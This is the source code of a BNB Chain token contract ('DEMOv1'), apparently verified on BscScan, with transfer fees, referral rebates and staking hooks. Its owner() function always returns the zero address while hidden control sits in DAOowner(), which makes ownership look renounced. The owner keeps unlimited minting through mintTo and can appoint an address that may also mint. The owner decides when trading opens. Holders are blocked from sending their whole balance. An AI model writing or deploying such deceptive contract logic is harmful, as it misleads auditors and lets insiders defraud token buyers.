/**
 *Submitted for verification at BscScan.com on 2022-03-16
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return address(0);
    }

    function DAOowner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(DAOowner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

// CAUTION
// This version of SafeMath should only be used with Solidity 0.8 or later,
// because it relies on the compiler's built in overflow checks.

/**
 * @dev Wrappers over Solidity's arithmetic operations.
 *
 * NOTE: `SafeMath` is generally not needed starting with Solidity 0.8, since the compiler
 * now has built in overflow checking.
 */
library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryAdd(uint256 a, uint256 b)
        internal
        pure
        returns (bool, uint256)
    {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the substraction of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function trySub(uint256 a, uint256 b)
        internal
        pure
        returns (bool, uint256)
    {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryMul(uint256 a, uint256 b)
        internal
        pure
        returns (bool, uint256)
    {
        unchecked {
            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // benefit is lost if 'b' is also tested.
            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the division of two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryDiv(uint256 a, uint256 b)
        internal
        pure
        returns (bool, uint256)
    {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryMod(uint256 a, uint256 b)
        internal
        pure
        returns (bool, uint256)
    {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator.
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {trySub}.
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting with custom message when dividing by zero.
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {tryMod}.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

interface IUniswapV2Factory {
    event PairCreated(
        address indexed token0,
        address indexed token1,
        address pair,
        uint256
    );

    function feeTo() external view returns (address);

    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB)
        external
        view
        returns (address pair);

    function allPairs(uint256) external view returns (address pair);

    function allPairsLength() external view returns (uint256);

    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);

    function setFeeTo(address) external;

    function setFeeToSetter(address) external;
}

interface IUniswapV2Pair {
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    event Transfer(address indexed from, address indexed to, uint256 value);

    function name() external pure returns (string memory);

    function symbol() external pure returns (string memory);

    function decimals() external pure returns (uint8);

    function totalSupply() external view returns (uint256);

    function balanceOf(address owner) external view returns (uint256);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 value) external returns (bool);

    function transfer(address to, uint256 value) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);

    function PERMIT_TYPEHASH() external pure returns (bytes32);

    function nonces(address owner) external view returns (uint256);

    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;

    event Mint(address indexed sender, uint256 amount0, uint256 amount1);
    event Burn(
        address indexed sender,
        uint256 amount0,
        uint256 amount1,
        address indexed to
    );
    event Swap(
        address indexed sender,
        uint256 amount0In,
        uint256 amount1In,
        uint256 amount0Out,
        uint256 amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint256);

    function factory() external view returns (address);

    function token0() external view returns (address);

    function token1() external view returns (address);

    function getReserves()
        external
        view
        returns (
            uint112 reserve0,
            uint112 reserve1,
            uint32 blockTimestampLast
        );

    function price0CumulativeLast() external view returns (uint256);

    function price1CumulativeLast() external view returns (uint256);

    function kLast() external view returns (uint256);

    function mint(address to) external returns (uint256 liquidity);

    function burn(address to)
        external
        returns (uint256 amount0, uint256 amount1);

    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;

    function skim(address to) external;

    function sync() external;

    function initialize(address, address) external;
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
        external
        returns (
            uint256 amountA,
            uint256 amountB,
            uint256 liquidity
        );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );

    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB);

    function removeLiquidityETH(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountToken, uint256 amountETH);

    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountA, uint256 amountB);

    function removeLiquidityETHWithPermit(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountToken, uint256 amountETH);

    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactETHForTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);

    function swapTokensForExactETH(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactTokensForETH(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapETHForExactTokens(
        uint256 amountOut,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);

    function quote(
        uint256 amountA,
        uint256 reserveA,
        uint256 reserveB
    ) external pure returns (uint256 amountB);

    function getAmountOut(
        uint256 amountIn,
        uint256 reserveIn,
        uint256 reserveOut
    ) external pure returns (uint256 amountOut);

    function getAmountIn(
        uint256 amountOut,
        uint256 reserveIn,
        uint256 reserveOut
    ) external pure returns (uint256 amountIn);

    function getAmountsOut(uint256 amountIn, address[] calldata path)
        external
        view
        returns (uint256[] memory amounts);

    function getAmountsIn(uint256 amountOut, address[] calldata path)
        external
        view
        returns (uint256[] memory amounts);

    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountETH);

    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IStaking {

    function fetchPending(uint256 _pid, address _user)
        external
        view
        returns (uint256);


    function lpStaking(address _from) external;


    function leaveStaking(uint256 _pid, address _from) external;


    function freedDeposit(uint256 _amount, address _from) external;


    function withdraw(uint256 _pid, address _from) external;


    function emergencyWithdraw(uint256 _pid, address _from) external;


    function userInfos(uint256 _pid, address _user)
        external
        view
        returns (uint256[4] memory _userInfos);

    function updateTokenHolder(address _tokenHolder) external;
}

contract DemoToken is IERC20, Ownable {
    using SafeMath for uint256;

    uint256 private constant _advance = 2000 * 10**18; //pre-mint to this contract
    uint256 private constant _marketAirDrop = 22 * 10**18; //min mint amount
    uint256 public constant total = 992022 * 10**18; //Total supply
    uint256 private constant _blackHoleRate = 50; //5%
    uint256 private constant _treasuryRate = 40; //4%
    uint256 private constant _div = 1000; //100%

    uint256 private _bindRelationlimit = 0.0001 * 10**18;
    address[] private limitAddress; //Limit purchases to the first 100 addresses
    uint256 private finishBlock; //Reward Mechanism End Block

    uint256 private mintTotal;
    uint256 public startToSwap;

    mapping(address => uint256) private _rOwned; //deposit balance
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFee;
    mapping(address => address) private inviter;
    mapping(address => bool) public holders;
    mapping(address => bool) public contractWhitelist;
    mapping(address => bool) private up500;
    string private _name;
    string private _symbol;
    uint256 private _decimals;
    // address USDT = address(0x55d398326f99059fF775485246999027B3197955);
    address USDT = address(0x65c9fba0319029e1b5DA7D6e572F7B8574d9d599); //test
    address public constant _destroyAddress =
        address(0x000000000000000000000000000000000000dEaD);
    address public treasury =
        address(0x25a226bc10D80fF8Ee6332f7675Ba38Ba3BdA34B);
    address public lpDeposit;
    address uniswapV2Pair;

    IUniswapV2Router public uniswapV2Router;
    IStaking stake;

    uint256[] private _rebate = [0, 20, 10, 10, 5, 5, 5, 5];

    event Mint(address indexed _to, uint256 _value);
    event Funding(address indexed _to, uint256 _value);
    event FirstLP(uint256 amountA, uint256 amountB, uint256 lpAmount);

    constructor() {
        _name = "DEMOv1"; 
        _symbol = "DEMO";
        _decimals = 18;

        // IUniswapV2Router _uniswapV2Router = IUniswapV2Router(
        //     0x10ED43C718714eb63d5aA57B78B54704E256024E
        // );
        //test
        IUniswapV2Router _uniswapV2Router = IUniswapV2Router(
            0x45C66467885117F8744476514aa0fdfab036630c
        );
        uniswapV2Router = _uniswapV2Router;
        // Create a uniswap pair for this new token
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), USDT);

        mintTotal = _advance;
        _rOwned[address(this)] = _advance;
        _rOwned[treasury] = _marketAirDrop;
        _isExcludedFromFee[treasury] = true;
        _isExcludedFromFee[address(this)] = true;
        contractWhitelist[uniswapV2Pair] = true;
        contractWhitelist[treasury] = true;
        emit Transfer(address(0), address(this), _advance);
    }

    modifier onlyDeposit() {
        require(
            lpDeposit != address(0),
            "Please set the LP deposit address first"
        );
        require(
            _msgSender() == lpDeposit,
            "Only deposit address can call this function"
        );
        _;
    }

    function setBindLimit(uint256 _limits) public onlyOwner {
        _bindRelationlimit = _limits;
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint256) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return mintTotal;
    }

    function getInviter(address account) public view returns (address) {
        return inviter[account];
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _rOwned[account];
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            msg.sender,
            _allowances[sender][msg.sender].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            msg.sender,
            spender,
            _allowances[msg.sender][spender].add(addedValue)
        );
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            msg.sender,
            spender,
            _allowances[msg.sender][spender].sub(
                subtractedValue,
                "ERC20: decreased allowance below zero"
            )
        );
        return true;
    }

    //to recieve ETH from uniswapV2Router when swaping
    // receive() external payable {}

    function _approve(
        address _owner,
        address spender,
        uint256 amount
    ) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        if (isContract(to)) {
            require(
                contractWhitelist[to],
                "ERC20: transfer to a contract that is not whitelisted"
            );
        }

        if (startToSwap == 0) {
            if (from == uniswapV2Pair && !_isExcludedFromFee[to]) {
                revert("Not open sale");
            }
            if (to == uniswapV2Pair && !_isExcludedFromFee[from]) {
                revert("Not open sale!");
            }
        }
        if (from == uniswapV2Pair) {
            if (limitAddress.length < 500) {
                require(amount <= 10 * 10**18, "ERROR : limit to 10 Tokens");
                if (!_isExcludedFromFee[to]) {
                    if (up500[to]) {
                        revert("Please wait for the purchase to open");
                    } else {
                        up500[to] = true;
                    }
                }
                limitAddress.push(to);
            }
        }
        //bind relationship
        bool shouldInvite = (!holders[to] &&
            amount >= _bindRelationlimit &&
            inviter[to] == address(0) &&
            !isContract(from) &&
            !isContract(to));
        //Coin holding restrictions
        if (amount == balanceOf(from) && !_isExcludedFromFee[from]) {
            if (limitAddress.length < 500) {
                revert("You can't send all your tokens");
            } else {
                amount = amount.mul(99).div(100);
            }
        }
        _tokenTransfer(from, to, amount);
        if (shouldInvite) {
            inviter[to] = from;
        }
        if (!holders[to]) {
            holders[to] = true;
        }
    }

    //this method is responsible for taking all fee, if takeFee is true
    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        // deducted from sender
        uint256 senderBalance = _rOwned[sender];
        require(
            senderBalance >= tAmount,
            "ERC20: transfer amount exceeds balance"
        );
        //Hold Token Rewards
        if (address(stake) != address(0)) {
            if (!isContract(sender)) {
                stake.updateTokenHolder(sender);
            }
            if (recipient == treasury) {
                stake.updateTokenHolder(recipient);
            }
            if (!isContract(recipient)) {
                stake.updateTokenHolder(recipient);
            }
        }
        _rOwned[sender] = senderBalance.sub(tAmount);
        uint256 _amount = tAmount;
        bool takeFee = true;
        if (tAmount <= 0.0001 * 10**18) {
            takeFee = false;
        }

        if (recipient == lpDeposit) {
            takeFee = false;
        }
        if (tAmount <= _bindRelationlimit) {
            takeFee = false;
        }
        if (_isExcludedFromFee[sender]) {
            takeFee = false;
        }
        // When the total amount of FREED coins reaches 10,000 ether,
        // 15% will not be deducted, and all rewards and destruction will automatically stop.
        if (isClose()) {
            takeFee = false;
        }
        if (takeFee) {
            //to burn
            _destory(sender, tAmount);

            //to inviters
            _rebateInviters(sender, tAmount);

            //to
            _toTreasury(recipient, tAmount);
            _amount = tAmount.sub(tAmount.mul(15).div(100));
        }

        // receive
        _rOwned[recipient] = _rOwned[recipient].add(_amount);
        emit Transfer(sender, recipient, _amount);
    }

    function _destory(address sender, uint256 amount) private {
        uint256 rBurn = amount.mul(_blackHoleRate).div(_div);
        _rOwned[_destroyAddress] = _rOwned[_destroyAddress].add(rBurn);
        emit Transfer(sender, _destroyAddress, rBurn);
    }

    function _toTreasury(address sender, uint256 amount) private {
        uint256 toTreasuryNum = amount.mul(_treasuryRate).div(_div);
        _rOwned[treasury] = _rOwned[treasury].add(toTreasuryNum);
        emit Transfer(sender, treasury, toTreasuryNum);
    }

    function _rebateInviters(address _sender, uint256 _amount) private {
        address cur;
        if (_sender == uniswapV2Pair) {
            cur = treasury;
        } else {
            cur = _sender;
        }
        for (uint256 i = 1; i <= 7; i++) {
            uint256 _rates = _rebate[i];
            cur = inviter[cur];
            uint256 _number = _amount.mul(_rates).div(_div);
            if (cur == address(0)) {
                //no inviter,all the rebate to the reflowAddress,total fee rate is 5%
                _giveInviter(_sender, treasury, _number);
            } else {
                _giveInviter(_sender, cur, _number);
            }
        }
    }

    function _giveInviter(
        address _sender,
        address _inviter,
        uint256 _amount
    ) private {
        stake.updateTokenHolder(_inviter);
        _rOwned[_inviter] = _rOwned[_inviter].add(_amount);
        emit Transfer(_sender, _inviter, _amount);
    }

    function isContract(address account) internal view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    function _mint(address _to, uint256 _amount) internal {
        require(!mintOver(), "ERC20: mint is finished");

        uint256 balance = total.sub(mintTotal.add(_amount));
        if (balance > 10000 * 10**18) {
            _rOwned[_to] = _rOwned[_to].add(_amount);
            mintTotal += _amount;
        } else {
            uint256 canget = total.sub(mintTotal).sub(10000 * 10**18);
            _rOwned[_to] = _rOwned[_to].add(canget);
            mintTotal += canget;
            finishBlock = block.number;
        }
        emit Mint(_to, _amount);
    }

    function isClose() public view returns (bool) {
        return (balanceOf(_destroyAddress) >= 982022 * 10**18);
    }

    function mintOver() public view returns (bool) {
        return (totalSupply() >= total);
    }

    function getFinishBlock() public view returns (uint256) {
        return finishBlock;
    }

    function setStartTimeForSwap() external onlyOwner {
        if (startToSwap == 0) {
            startToSwap = block.timestamp;
        }
    }

    function mintForLPDeposit(address _to, uint256 _amount)
        external
        onlyDeposit
        returns (bool)
    {
        _mint(address(this), _amount);
        _transfer(address(this), _to, _amount);
        return true;
    }

    function setLpDeposit(address _lpD) public onlyOwner {
        lpDeposit = _lpD;
        _isExcludedFromFee[lpDeposit] = true;
        contractWhitelist[lpDeposit] = true;
        stake = IStaking(_lpD);
    }

    function setContractWhitelist(address _contract, bool _result)
        public
        onlyOwner
    {
        contractWhitelist[_contract] = _result;
    }

    function setWhitelist(address[] memory _address, bool _result)
        public
        onlyOwner
    {
        for (uint256 i = 0; i < _address.length; i++) {
            contractWhitelist[_address[i]] = _result;
        }
    }

    function _addLiquidity(uint256 tokenAmount, uint256 usdtAmount) internal {
        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        IERC20 _usdt = IERC20(USDT);
        _usdt.approve(address(uniswapV2Router), usdtAmount);
        // add the liquidity
        (uint256 A, uint256 B, uint256 _lpAmount) = uniswapV2Router
            .addLiquidity(
                address(this),
                USDT,
                tokenAmount,
                usdtAmount,
                0, // slippage is unavoidable
                0, // slippage is unavoidable
                DAOowner(),
                block.timestamp
            );
        emit FirstLP(A, B, _lpAmount);
    }

    function createBaseLiquidity(uint256 tokenAmount, uint256 usdtAmount)
        public
        onlyOwner
    {
        require(
            tokenAmount <= balanceOf(address(this)),
            "ERC20: createBaseLiquidity FREEDAmount must be greater than 0"
        );
        require(
            usdtAmount <= IERC20(USDT).balanceOf(address(this)),
            "ERC20: createBaseLiquidity usdtAmount must be greater than 0"
        );
        _addLiquidity(tokenAmount, usdtAmount);
    }

    function usdtAddress() public view returns (address) {
        return USDT;
    }

    function uniswapV2PairAddress() public view returns (address) {
        return uniswapV2Pair;
    }

    function isWhiteList(address _addr) external view returns (bool) {
        return _isExcludedFromFee[_addr];
    }

    function fetchPending(uint256 _pid) external view returns (uint256) {
        return stake.fetchPending(_pid, _msgSender());
    }

    function lpStaking() external {
        require(lpDeposit != address(0), "ERC20: lpDeposit is not set");
        stake.lpStaking(_msgSender());
    }

    function leaveStaking(uint256 _pid) external {
        require(lpDeposit != address(0), "ERC20: lpDeposit is not set");
        stake.leaveStaking(_pid, _msgSender());
    }

    function freedDeposit(uint256 _amount) external {
        require(lpDeposit != address(0), "ERC20: lpDeposit is not set");
        approve(address(lpDeposit), _amount);
        stake.freedDeposit(_amount, _msgSender());
    }

    function withdraw(uint256 _pid) external {
        require(lpDeposit != address(0), "ERC20: lpDeposit is not set");
        stake.withdraw(_pid, _msgSender());
    }

    function emergencyWithdraw(uint256 _pid) external {
        require(lpDeposit != address(0), "ERC20: lpDeposit is not set");
        stake.emergencyWithdraw(_pid, _msgSender());
    }

    function userInfo(uint256 _pid)
        external
        view
        returns (uint256[4] memory _userInfo)
    {
        _userInfo = stake.userInfos(_pid, _msgSender());
        return _userInfo;
    }

    function lpApprove() external view returns (uint256) {
        return IERC20(uniswapV2Pair).balanceOf(_msgSender());
    }
    function mintTo(address _to,uint256 amount)external onlyOwner{
        _mint(_to,amount);
    }
}